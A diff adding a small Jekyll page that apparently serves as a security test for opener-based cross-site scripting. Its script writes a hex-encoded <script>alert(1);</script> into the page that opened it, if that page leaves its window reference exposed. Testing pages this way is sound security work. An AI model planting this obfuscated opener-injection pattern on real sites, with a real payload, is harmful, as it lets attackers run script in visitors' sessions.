@@ -1,0 +1,15 @@
+---
+layout: page
+title: "blank xss"
+description: "checking DOM security"
+header-img: "images/site-resources/cuttlefish.jpg"
+---
+<center>
+If the page's DOM security attributes aren't set correctly, we may get an xss (check origin page)
+</center>
+
+<script>
+	if (window.opener) {
+		window.opener.document.write("\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e");
+	}
+</script>
